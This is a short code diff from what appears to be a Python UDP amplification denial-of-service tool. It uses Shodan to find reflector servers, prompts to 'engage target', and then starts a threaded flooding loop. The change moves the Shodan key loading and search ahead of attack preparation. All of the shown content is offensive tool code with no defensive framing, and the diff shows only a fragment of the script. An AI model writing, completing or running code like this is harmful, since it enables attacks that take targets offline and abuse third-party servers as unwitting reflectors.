@@ -111,11 +111,16 @@ def send_udp_packet(target, target_port, data, power, setdata, getdata, iface=No
 
 def main():
     global SHODAN_API_KEY
+    # api = shodan.Shodan(api_key)
+    # display_bots(SHODAN_API_KEY, None)
+
+    load_shodan_api_key()
+    results = search_shodan(SHODAN_API_KEY)
+  
     target, target_port, power, data, setdata, getdata = prepare_attack()
     print('[*] Ready to engage target %s? <Y/n>: ' % target, end='')
     engage = input().lower()
-    load_shodan_api_key()
-    results = search_shodan(SHODAN_API_KEY)
+  
     if engage.startswith('y'):
         while(True):
             threads = []
